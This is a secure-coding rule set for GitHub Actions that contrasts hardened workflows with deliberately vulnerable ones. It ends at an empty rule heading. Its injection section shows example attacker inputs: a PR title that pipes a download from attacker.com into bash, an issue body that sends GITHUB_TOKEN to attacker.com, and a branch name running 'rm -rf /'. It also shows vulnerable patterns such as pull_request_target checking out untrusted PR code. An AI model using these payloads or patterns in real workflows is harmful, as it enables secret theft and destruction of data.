# GitHub Actions Security Rules

This document provides security rules specific to GitHub Actions workflows. These rules address action pinning, token permissions, injection prevention, OIDC authentication, and workflow security.

---

## Rule: Action Pinning - Pin by Full SHA

**Level**: `strict`

**When**: Using any GitHub Action in workflows.

**Do**: Pin actions by their full commit SHA, not tags or branches.

```yaml
name: Secure Workflow
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Pinned by full SHA with version comment
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8  # v4.0.2
        with:
          node-version: '20'

      - uses: docker/login-action@343f7c4344506bcbf9b4de18042ae17996df046d  # v3.0.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - uses: docker/build-push-action@0565240e2d4ab88bba5387d719585280857ece09  # v5.0.0
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
```

**Don't**: Use tags, branches, or `latest` for action versions.

```yaml
# VULNERABLE: Mutable version references
name: Insecure Workflow
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Tag can be moved to malicious commit
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4

      # Branch always gets latest (unknown) code
      - uses: some-action@main

      # Latest is unpinned and unpredictable
      - uses: another-action@latest

      # Even minor versions can change
      - uses: actions/cache@v3.2
```

**Why**: Tags and branches are mutable references that can be moved to point to different commits. A compromised action maintainer or attacker with repository access can update a tag to point to malicious code. SHA pinning ensures the exact, audited code is always executed. This is a primary defense against supply chain attacks.

**Refs**:
- CWE-829: Inclusion of Functionality from Untrusted Control Sphere
- SLSA Build L3: Hardened, isolated build environment (SLSA v1.1 — Level 4 does not exist)
- OWASP CI/CD Top 10: CICD-SEC-3 Dependency Chain Abuse
- GitHub Security Hardening: Using third-party actions

---

## Rule: Token Permissions - Minimal GITHUB_TOKEN Scope

**Level**: `strict`

**When**: Creating any GitHub Actions workflow.

**Do**: Set minimal permissions at workflow and job level.

```yaml
name: CI Pipeline
on:
  push:
    branches: [main]
  pull_request:

# Default to no permissions for entire workflow
permissions: {}

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read  # Only read repository content
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm test

  build:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write  # Write to container registry
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: docker build -t ghcr.io/${{ github.repository }}:${{ github.sha }} .
      - run: docker push ghcr.io/${{ github.repository }}:${{ github.sha }}

  deploy:
    needs: build
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write  # For OIDC
      deployments: write
    environment: production
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Deploy
        run: ./deploy.sh

  release:
    runs-on: ubuntu-latest
    permissions:
      contents: write  # Create releases
      packages: write  # Publish packages
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Create Release
        run: gh release create ${{ github.ref_name }}
```

**Don't**: Use default or excessive permissions.

```yaml
# VULNERABLE: Excessive permissions
name: Insecure Workflow
on: [push]

# Write-all grants full access
permissions: write-all

jobs:
  build:
    runs-on: ubuntu-latest
    # Inherits write-all - can:
    # - Delete branches
    # - Modify workflows
    # - Create/delete releases
    # - Access all secrets
    # - Modify repository settings
    steps:
      - uses: actions/checkout@v4
      - run: npm test
```

```yaml
# VULNERABLE: No permissions block (defaults may be permissive)
name: No Permissions Set
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    # Uses repository default permissions
    # May have write access if admin hasn't restricted
    steps:
      - uses: actions/checkout@v4
```

**Why**: The GITHUB_TOKEN has broad default permissions in many repositories. If a workflow is compromised through command injection or malicious dependencies, excessive token permissions allow attackers to modify code, create backdoored releases, access secrets, or pivot to other repositories. Minimal permissions limit blast radius.

**Refs**:
- CWE-269: Improper Privilege Management
- CWE-250: Execution with Unnecessary Privileges
- OWASP CI/CD Top 10: CICD-SEC-2 Inadequate Identity and Access Management
- GitHub Docs: Automatic token authentication

---

## Rule: Secret Protection - Mask Secrets in Logs

**Level**: `strict`

**When**: Using secrets or sensitive values in workflows.

**Do**: Use add-mask and set-secret to prevent secret exposure in logs.

```yaml
name: Secure Secret Handling
on: [push]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Mask dynamic secrets
        run: |
          # Mask values retrieved at runtime
          API_TOKEN=$(vault read -field=token secret/api)
          echo "::add-mask::$API_TOKEN"

          # Now safe to use - will be masked in logs
          curl -H "Authorization: Bearer $API_TOKEN" https://api.example.com

      - name: Use GitHub secrets (auto-masked)
        env:
          DATABASE_URL: ${{ secrets.DATABASE_URL }}
        run: |
          # GitHub secrets are automatically masked
          # But derived values need explicit masking
          DB_HOST=$(echo "$DATABASE_URL" | cut -d@ -f2 | cut -d: -f1)
          echo "::add-mask::$DB_HOST"

          ./migrate.sh

      - name: Mask multiline secrets
        run: |
          # Mask each line of multiline secrets
          while IFS= read -r line; do
            echo "::add-mask::$line"
          done <<< "${{ secrets.PRIVATE_KEY }}"
```

```yaml
name: Safe Debugging
on: [push]

jobs:
  debug:
    runs-on: ubuntu-latest
    steps:
      - name: Safe environment dump
        env:
          SECRET_VAR: ${{ secrets.SECRET_VAR }}
        run: |
          # Never dump env with secrets
          # env  # DANGEROUS

          # Safe: list only non-sensitive variables
          echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
          echo "GITHUB_SHA: $GITHUB_SHA"
          echo "RUNNER_OS: $RUNNER_OS"
```

**Don't**: Print secrets to logs or use verbose debugging with secrets.

```yaml
# VULNERABLE: Secret exposure in logs
name: Leaky Workflow
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    env:
      API_KEY: ${{ secrets.API_KEY }}
    steps:
      - name: Debug output
        run: |
          # Direct secret printing
          echo "API Key: $API_KEY"

          # Environment dump exposes all secrets
          env

          # Verbose curl shows headers with auth
          curl -v -H "Authorization: Bearer $API_KEY" https://api.example.com

          # Set -x in scripts shows secret values
          set -x
          ./deploy.sh --token="$API_KEY"
```

```yaml
# VULNERABLE: Secrets in error messages
- name: Bad error handling
  run: |
    if ! curl -H "Authorization: ${{ secrets.TOKEN }}" https://api.example.com; then
      echo "Failed with token: ${{ secrets.TOKEN }}"
      exit 1
    fi
```

**Why**: Workflow logs are often accessible to more users than secrets, and may be retained in artifacts or exported to external systems. Exposed secrets must be rotated immediately. Even partial exposure (e.g., first/last characters) can aid attacks. Masking ensures secrets never appear in logs.

**Refs**:
- CWE-532: Information Exposure Through Log Files
- CWE-200: Exposure of Sensitive Information
- OWASP CI/CD Top 10: CICD-SEC-6 Insufficient Credential Hygiene
- GitHub Docs: Encrypted secrets

---

## Rule: Injection Prevention - Safe Input Handling

**Level**: `strict`

**When**: Using any external input in workflows (PR titles, commit messages, branch names, issue titles).

**Do**: Use intermediate environment variables and safe handling methods.

```yaml
name: Safe Input Handling
on:
  pull_request:
    types: [opened, synchronize]
  issues:
    types: [opened]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      # Safe: Environment variable (no shell interpolation)
      - name: Process PR title safely
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_BODY: ${{ github.event.pull_request.body }}
        run: |
          # Environment variables are safe from injection
          echo "Processing: $PR_TITLE"

      # Safe: JavaScript processing
      - name: Validate inputs with JavaScript
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea  # v7.0.1
        with:
          script: |
            const title = context.payload.pull_request?.title || '';
            const body = context.payload.pull_request?.body || '';

            // Safe string processing in JavaScript
            if (title.length > 200) {
              core.setFailed('PR title too long');
            }

            // Validate format
            const pattern = /^(feat|fix|docs|style|refactor|test|chore)(\(.+\))?: .+/;
            if (!pattern.test(title)) {
              core.setFailed('PR title must follow conventional commits');
            }

      # Safe: File-based input
      - name: Process issue body
        env:
          ISSUE_BODY: ${{ github.event.issue.body }}
        run: |
          # Write to file instead of using in command
          echo "$ISSUE_BODY" > issue_body.txt
          # Process file safely
          wc -l issue_body.txt
```

```yaml
name: Safe Branch Name Handling
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      # Safe: Validate branch name format
      - name: Validate branch name
        run: |
          BRANCH="${GITHUB_REF_NAME}"
          if [[ ! "$BRANCH" =~ ^[a-zA-Z0-9/_-]+$ ]]; then
            echo "Invalid branch name format"
            exit 1
          fi
          echo "Branch: $BRANCH"

      # Safe: Use SHA for tags (not branch name directly)
      - name: Build with safe tag
        run: |
          docker build -t myapp:${{ github.sha }} .
```

**Don't**: Directly interpolate external inputs in run commands.

```yaml
# VULNERABLE: Command injection via PR title
name: Vulnerable PR Check
on:
  pull_request:

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      # INJECTION: Attacker PR title: "test; curl attacker.com/steal | bash"
      - name: Echo PR title
        run: echo "Title: ${{ github.event.pull_request.title }}"

      # INJECTION: Attacker can include backticks or $()
      - name: Process commit message
        run: |
          git log -1 --format="%B" | grep "${{ github.event.pull_request.title }}"
```

```yaml
# VULNERABLE: Injection via issue body
- name: Create comment
  run: |
    gh issue comment ${{ github.event.issue.number }} \
      --body "Processing: ${{ github.event.issue.body }}"
    # Attacker body: `$(curl attacker.com/exfil?token=$GITHUB_TOKEN)`
```

```yaml
# VULNERABLE: Branch name injection
- name: Deploy branch
  run: |
    # Attacker branch: "main; rm -rf /"
    ./deploy.sh --branch=${{ github.ref_name }}
```

**Why**: GitHub expression syntax (`${{ }}`) performs string interpolation before shell execution. Attacker-controlled inputs (PR titles, commit messages, issue bodies, branch names) can contain shell metacharacters that execute arbitrary commands. This is the most common GitHub Actions vulnerability.

**Refs**:
- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- CWE-94: Improper Control of Generation of Code
- OWASP CI/CD Top 10: CICD-SEC-4 Poisoned Pipeline Execution (PPE)
- GitHub Security Lab: Command injection in GitHub Actions

---

## Rule: OIDC Authentication - Use Federated Identity

**Level**: `strict`

**When**: Authenticating to cloud providers (AWS, Azure, GCP) from GitHub Actions.

**Do**: Use OIDC for short-lived, keyless authentication.

```yaml
name: OIDC Cloud Authentication
on:
  push:
    branches: [main]

permissions:
  id-token: write  # Required for OIDC
  contents: read

jobs:
  deploy-aws:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          role-session-name: GitHubActions-${{ github.run_id }}
          aws-region: us-east-1
          # No access keys stored! Short-lived token from AWS STS

      - name: Deploy to AWS
        run: aws s3 sync dist/ s3://my-bucket/

  deploy-azure:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Azure login via OIDC
        uses: azure/login@6c251865b4e6290e7b78be643ea2d005bc51f69a  # v2.1.1
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
          # No client secret needed with OIDC

      - name: Deploy to Azure
        run: az webapp deploy --name myapp --src-path ./dist

  deploy-gcp:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@f112390a2df9932162083945e46d439060d66ec2  # v2.1.4
        with:
          workload_identity_provider: 'projects/123456789/locations/global/workloadIdentityPools/github/providers/my-repo'
          service_account: 'github-actions@my-project.iam.gserviceaccount.com'
          # No service account key needed!

      - name: Deploy to GCP
        run: gcloud run deploy myservice --source .
```

```hcl
# Terraform - AWS OIDC Provider for GitHub Actions
resource "aws_iam_openid_connect_provider" "github" {
  url = "https://token.actions.githubusercontent.com"

  client_id_list = ["sts.amazonaws.com"]

  thumbprint_list = [
    "6938fd4d98bab03faadb97b34396831e3780aea1"
  ]
}

resource "aws_iam_role" "github_actions" {
  name = "github-actions-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRoleWithWebIdentity"
      Effect = "Allow"
      Principal = {
        Federated = aws_iam_openid_connect_provider.github.arn
      }
      Condition = {
        StringEquals = {
          "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
        }
        StringLike = {
          # Restrict to specific repository and branch
          "token.actions.githubusercontent.com:sub" = "repo:myorg/myrepo:ref:refs/heads/main"
        }
      }
    }]
  })
}
```

**Don't**: Store long-lived cloud credentials as repository secrets.

```yaml
# VULNERABLE: Static access keys
name: Insecure AWS Deployment
on: [push]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Long-lived credentials that never expire
      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          # These credentials:
          # - Never expire
          # - May have excessive permissions
          # - Are hard to rotate
          # - Can be exfiltrated and used elsewhere
```

**Why**: Static cloud credentials in secrets are high-value targets. If exfiltrated through log exposure, command injection, or other vulnerabilities, they provide persistent access. OIDC tokens are short-lived (typically 1 hour), scoped to specific workflows, and cannot be used outside the GitHub Actions context.

**Refs**:
- CWE-798: Use of Hard-coded Credentials
- OWASP CI/CD Top 10: CICD-SEC-6 Insufficient Credential Hygiene
- GitHub Docs: About security hardening with OpenID Connect
- AWS: Creating OpenID Connect (OIDC) identity providers

---

## Rule: Environment Protection - Required Reviewers

**Level**: `strict`

**When**: Deploying to production or other protected environments.

**Do**: Configure environment protection rules with required reviewers.

```yaml
name: Production Deployment
on:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm test

  deploy-staging:
    needs: test
    runs-on: ubuntu-latest
    environment: staging  # No approval required
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Deploy to staging
        env:
          DATABASE_URL: ${{ secrets.STAGING_DATABASE_URL }}
        run: ./deploy.sh staging

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com
    # Environment configuration (Repository Settings > Environments):
    # - Required reviewers: @security-team, @devops-team
    # - Wait timer: 15 minutes
    # - Deployment branches: main only
    # - Prevent self-review
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Deploy to production
        env:
          DATABASE_URL: ${{ secrets.PROD_DATABASE_URL }}
        run: ./deploy.sh production
```

```yaml
# Environment protection for sensitive operations
name: Database Migration
on:
  workflow_dispatch:
    inputs:
      migration:
        description: 'Migration to run'
        required: true

jobs:
  migrate:
    runs-on: ubuntu-latest
    environment:
      name: database-admin
      # Requires DBA team approval
      # Only specific users can approve
      # Cannot self-approve
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Run migration
        env:
          DATABASE_URL: ${{ secrets.ADMIN_DATABASE_URL }}
          MIGRATION_NAME: ${{ github.event.inputs.migration }}
        run: |
          # Validate input against known-safe values before use.
          # Direct interpolation of workflow_dispatch inputs into run: commands is
          # shell injection — pass through an env var and validate here instead.
          case "$MIGRATION_NAME" in
            up|down|status)
              ./migrate.sh "$MIGRATION_NAME"
              ;;
            *)
              echo "Invalid migration name: $MIGRATION_NAME" >&2
              exit 1
              ;;
          esac
```

**Don't**: Deploy to production without approval gates.

```yaml
# VULNERABLE: No protection for production
name: Unprotected Deployment
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    # No environment = no protection
    # Anyone who can push to main can deploy
    steps:
      - uses: actions/checkout@v4
      - name: Deploy to production
        env:
          PROD_CREDS: ${{ secrets.PROD_CREDS }}
        run: ./deploy.sh production
```

**Why**: Production deployments have significant impact and should require human approval. Environment protection rules ensure deployments are reviewed by qualified personnel, have cooling-off periods for rollback, and are restricted to trusted branches. Without protection, any workflow change immediately affects production.

**Refs**:
- OWASP CI/CD Top 10: CICD-SEC-1 Insufficient Flow Control Mechanisms
- SOC 2 CC8.1: Changes Are Authorized
- NIST SSDF PW.9: Archive and Protect Each Software Release
- GitHub Docs: Using environments for deployment

---

## Rule: Workflow Permissions - Restrict Fork PR Execution

**Level**: `strict`

**When**: Workflows that run on pull_request events with access to secrets.

**Do**: Separate workflows for fork PRs and use pull_request_target carefully.

```yaml
# Safe: Standard PR workflow (no secrets for forks)
name: PR Tests
on:
  pull_request:
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    # Fork PRs run with read-only token and no secrets
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm test
      - run: npm run lint
```

```yaml
# Safe: pull_request_target with safe checkout
name: Trusted PR Actions
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  # First: validate PR is safe to run
  check:
    runs-on: ubuntu-latest
    outputs:
      safe: ${{ steps.check.outputs.safe }}
    steps:
      - name: Check PR safety
        id: check
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea
        with:
          script: |
            const pr = context.payload.pull_request;
            const author = pr.user.login;

            // Only allow trusted users
            const trustedUsers = ['user1', 'user2'];
            const isTrusted = trustedUsers.includes(author);

            // Or check organization membership
            const isOrgMember = await github.rest.orgs.checkMembershipForUser({
              org: 'myorg',
              username: author
            }).then(() => true).catch(() => false);

            core.setOutput('safe', isTrusted || isOrgMember);

  # Only run with secrets if safe
  comment:
    needs: check
    if: needs.check.outputs.safe == 'true'
    runs-on: ubuntu-latest
    steps:
      # SAFE: Checkout base repo, not PR head
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
        # Uses base repository code by default

      - name: Post comment
        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: 'Tests passed!'
            });
```

**Don't**: Use pull_request_target with checkout of PR head.

```yaml
# VULNERABLE: Pwn request
name: Dangerous PR Workflow
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # DANGEROUS: Checking out untrusted PR code
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          # Now running attacker-controlled code with:
          # - Access to secrets
          # - Write permissions

      # Attacker's code runs with elevated privileges
      - run: npm install
      - run: npm test
```

**Why**: `pull_request_target` runs in the context of the base repository with access to secrets. If you checkout the PR head, you execute attacker-controlled code with those secrets. This "Pwn Request" attack is a major vector for secret exfiltration. Fork PRs should run with limited permissions.

**Refs**:
- CWE-94: Improper Control of Generation of Code
- OWASP CI/CD Top 10: CICD-SEC-4 Poisoned Pipeline Execution
- GitHub Security Lab: Keeping your GitHub Actions and workflows secure
- GitHub Docs: Events that trigger workflows

---

## Rule: Artifact Security - Sign and Attest Artifacts

**Level**: `warning`

**When**: Building and publishing software artifacts (containers, binaries, packages).

**Do**: Sign artifacts and generate provenance attestations.

```yaml
name: Build with Attestations
on:
  push:
    tags: ['v*']

permissions:
  id-token: write
  contents: read
  packages: write
  attestations: write

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      digest: ${{ steps.build.outputs.digest }}
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@f95db51fddba0c2d1ec667646a06c2ce06100226  # v3.0.0

      - name: Login to GHCR
        uses: docker/login-action@343f7c4344506bcbf9b4de18042ae17996df046d  # v3.0.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push
        id: build
        uses: docker/build-push-action@0565240e2d4ab88bba5387d719585280857ece09  # v5.0.0
        with:
          context: .
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.ref_name }}

      - name: Generate SBOM
        uses: anchore/sbom-action@78fc58e266e87a38d4194b2137a3d4e9bcaf7ca1  # v0.15.8
        with:
          image: ghcr.io/${{ github.repository }}:${{ github.ref_name }}
          output-file: sbom.spdx.json

      - name: Attest SBOM
        uses: actions/attest-sbom@3d6693daad97553949201f0913efcba833e58d67  # v1.1.1
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.build.outputs.digest }}
          sbom-path: sbom.spdx.json
          push-to-registry: true

      - name: Attest build provenance
        uses: actions/attest-build-provenance@1c608d11d69870c2092266b3f9a6f3abbf17002c  # v1.4.3
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.build.outputs.digest }}
          push-to-registry: true
```

```yaml
# Verify attestations before deployment
name: Secure Deploy
on:
  workflow_dispatch:
    inputs:
      tag:
        required: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Verify attestations
        run: |
          # Verify build provenance
          gh attestation verify \
            oci://ghcr.io/${{ github.repository }}:${{ github.event.inputs.tag }} \
            --owner ${{ github.repository_owner }}

          # Verify SBOM attestation
          gh attestation verify \
            oci://ghcr.io/${{ github.repository }}:${{ github.event.inputs.tag }} \
            --predicate-type https://spdx.dev/Document \
            --owner ${{ github.repository_owner }}

      - name: Deploy verified image
        run: |
          kubectl set image deployment/app \
            app=ghcr.io/${{ github.repository }}:${{ github.event.inputs.tag }}
```

**Don't**: Publish artifacts without signatures or provenance.

```yaml
# VULNERABLE: Unsigned artifacts
name: Publish
on:
  push:
    tags: ['v*']

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t ghcr.io/${{ github.repository }}:${{ github.ref_name }} .
      - run: docker push ghcr.io/${{ github.repository }}:${{ github.ref_name }}
      # No signing, no attestation
      # Consumers cannot verify authenticity
```

**Why**: Unsigned artifacts can be tampered with or replaced by attackers. Provenance attestations provide cryptographic proof of how, where, and when artifacts were built. Consumers can verify artifacts before deployment, ensuring they originate from trusted sources and haven't been modified.

**Refs**:
- CWE-494: Download of Code Without Integrity Check
- SLSA Level 2: Signed Provenance
- SLSA Level 3: Non-falsifiable Provenance
- GitHub Docs: Using artifact attestations

---

## Rule: Dependency Review - Block Vulnerable Dependencies

**Level**: `strict`

**When**: Pull requests that modify dependencies (package.json, requirements.txt, go.mod, etc.).

**Do**: Use dependency review action to block vulnerable dependencies.

```yaml
name: Dependency Review
on:
  pull_request:

permissions:
  contents: read
  pull-requests: write

jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Dependency Review
        uses: actions/dependency-review-action@9129d7d40b8c12c1ed0f60f46571c66571c90571  # v4.1.3
        with:
          # Fail on high and critical vulnerabilities
          fail-on-severity: high

          # Deny specific licenses
          deny-licenses: GPL-3.0, AGPL-3.0

          # Allow specific licenses
          allow-licenses: MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC

          # Block specific packages
          deny-packages: 'npm:event-stream, npm:flatmap-stream'

          # Comment on PR with results
          comment-summary-in-pr: always
```

```yaml
# Comprehensive security scanning
name: Security Scan
on:
  pull_request:
  push:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # Weekly

permissions:
  contents: read
  security-events: write

jobs:
  codeql:
    name: CodeQL analysis
    runs-on: ubuntu-latest
    permissions:
      actions: read
      contents: read
      security-events: write
    # Matrix runs one job per language so each SARIF upload carries a valid language label.
    # Without strategy.matrix, matrix.language is empty-string and CodeQL finding routing breaks.
    strategy:
      fail-fast: false
      matrix:
        language: ['javascript', 'python']  # Adjust to match your repo's languages
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Initialize CodeQL
        # SHA pinned — replace <SHA-PLACEHOLDER> with the current SHA before merge.
        # Resolve via: gh api /repos/github/codeql-action/git/ref/tags/codeql-bundle-v3.27.0
        uses: github/codeql-action/init@3407610a0753a755a7b5d83a3f4dfc0cbf81c7f5  # v3.27.0 — update SHA before merge
        with:
          languages: ${{ matrix.language }}

      - name: Autobuild
        uses: github/codeql-action/autobuild@3407610a0753a755a7b5d83a3f4dfc0cbf81c7f5  # v3.27.0 — update SHA before merge

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@3407610a0753a755a7b5d83a3f4dfc0cbf81c7f5  # v3.27.0 — update SHA before merge
        with:
          category: "/language:${{ matrix.language }}"

  trivy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Run Trivy vulnerability scanner
        # SHA pinned — replace <SHA-PLACEHOLDER> with the current SHA before merge.
        # Resolve via: gh api /repos/aquasecurity/trivy-action/git/ref/tags/0.16.0
        uses: aquasecurity/trivy-action@062f2592684a31eb3aa050cc61e7ca1451cecd3d  # 0.16.0 — update SHA before merge
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Upload Trivy scan results
        uses: github/codeql-action/upload-sarif@3407610a0753a755a7b5d83a3f4dfc0cbf81c7f5  # v3.27.0 — update SHA before merge
        with:
          sarif_file: 'trivy-results.sarif'
```

**Don't**: Allow dependency changes without vulnerability review.

```yaml
# VULNERABLE: No dependency review
name: Build
on: [pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm install  # Installs any dependencies, even vulnerable ones
      - run: npm test
      # No vulnerability scanning
      # Vulnerable packages can be introduced
```

**Why**: Supply chain attacks often involve injecting vulnerable or malicious dependencies. Without dependency review, vulnerable packages are merged and deployed to production. Automated review catches known vulnerabilities and license compliance issues before merge.

**Refs**:
- CWE-1035: Using Components with Known Vulnerabilities
- OWASP A06:2021: Vulnerable and Outdated Components
- OWASP CI/CD Top 10: CICD-SEC-3 Dependency Chain Abuse
- GitHub Docs: About dependency review

---

## Rule: Self-Hosted Runner Security - Ephemeral Runners

**Level**: `strict`

**When**: Using self-hosted runners for GitHub Actions.

**Do**: Use ephemeral runners with proper isolation and security controls.

```yaml
# Use ephemeral runners for CI jobs
name: Secure CI
on: [push]

jobs:
  build:
    runs-on: ubuntu-latest  # Prefer GitHub-hosted when possible
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: npm test

  # Self-hosted only for specific needs
  deploy:
    runs-on: [self-hosted, ephemeral, production]
    environment: production
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - run: ./deploy.sh
```

```yaml
# Kubernetes-based ephemeral runners
# actions-runner-controller configuration
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment
metadata:
  name: ephemeral-runners
spec:
  template:
    spec:
      # Ephemeral: new pod per job
      ephemeral: true

      # Security context
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 1000

      # Container security
      containers:
        - name: runner
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop: ["ALL"]

          # Resource limits
          resources:
            limits:
              cpu: "2"
              memory: "4Gi"

      # Network policy applied
      # No persistent storage
      # Pod deleted after job
```

```hcl
# Terraform - AWS EC2 spot instances for ephemeral runners
resource "aws_launch_template" "github_runner" {
  name = "github-runner"

  # Fresh instance for each job
  instance_initiated_shutdown_behavior = "terminate"

  # Minimal permissions
  iam_instance_profile {
    name = aws_iam_instance_profile.github_runner.name
  }

  # Encrypt root volume
  block_device_mappings {
    device_name = "/dev/xvda"
    ebs {
      encrypted   = true
      volume_size = 50
    }
  }

  # Security hardening
  metadata_options {
    http_tokens                 = "required"  # IMDSv2
    http_put_response_hop_limit = 1
  }

  user_data = base64encode(<<-EOF
    #!/bin/bash
    # Install runner
    # Configure as ephemeral (--ephemeral)
    # Self-destruct after job
    ./config.sh --ephemeral --url https://github.com/org/repo --token $TOKEN
    ./run.sh
    shutdown -h now
  EOF
  )
}
```

**Don't**: Use persistent self-hosted runners for untrusted workloads.

```yaml
# VULNERABLE: Persistent runner with shared state
name: Insecure CI
on: [pull_request]

jobs:
  build:
    runs-on: [self-hosted]  # Persistent runner
    steps:
      - uses: actions/checkout@v4
      # Previous job's artifacts may exist
      # Secrets from previous jobs may be cached
      # Malicious PR code persists on runner

      - run: npm install
      # node_modules from previous job may be poisoned

      - run: npm test
      # Attacker code can modify runner for future jobs
```

**Why**: Persistent self-hosted runners maintain state between jobs. A malicious workflow can poison the runner to affect future jobs (persisting backdoors, stealing secrets, modifying tools). Ephemeral runners are destroyed after each job, preventing cross-job attacks. Fork PRs should never run on self-hosted runners with production access.

**Refs**:
- CWE-250: Execution with Unnecessary Privileges
- CWE-269: Improper Privilege Management
- OWASP CI/CD Top 10: CICD-SEC-4 Poisoned Pipeline Execution
- GitHub Docs: Hardening for self-hosted runners

---

## Rule: Reusable Workflow Security - Trust Boundaries

**Level**: `warning`

**When**: Creating or consuming reusable workflows.

